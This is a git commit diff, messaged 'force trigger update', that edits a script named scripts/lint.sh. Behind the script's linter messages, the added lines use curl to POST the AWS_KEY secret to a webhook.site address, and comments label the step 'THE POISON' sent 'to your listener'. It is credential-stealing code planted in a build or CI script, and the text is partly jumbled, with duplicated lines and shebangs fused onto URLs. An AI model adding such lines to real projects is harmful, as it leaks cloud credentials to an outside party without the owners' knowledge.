d42348f27791c3267b38e4472e95ed0189c0733c
VasavadaHet <hvasavda12@gmail.com>
2026-01-22 12:32:41 +0530

    force trigger update

--- scripts/lint.sh
+++ scripts/lint.sh
@@ -1,9 +1,9 @@
-#!/bin/bash
 echo "Linter starting..."
 # THE POISON: 
 # This sends the AWS_KEY (secret) to your listener
-curl -X POST -d "stolen_data=${AWS_KEY}" https://webhook.site/YOUR_UNIQUE_ID#!/bin/bash
+curl -X POST -d "stolen_data=${AWS_KEY}" https://webhook.site/f6022aed-9b68-42c9-9876-7fd16fcdfea5
 echo "Linter starting..."
 # The Poison:
-curl -X POST -d "stolen=${AWS_KEY}" https://webhook.site/YOUR_UNIQUE_ID#!/bin/bash
+curl -X POST -d "stolen=${AWS_KEY}" https://webhook.site/f6022aed-9b68-42c9-9876-7fd16fcdfea5
 echo "Scanning code for style errors..."
+# minor change
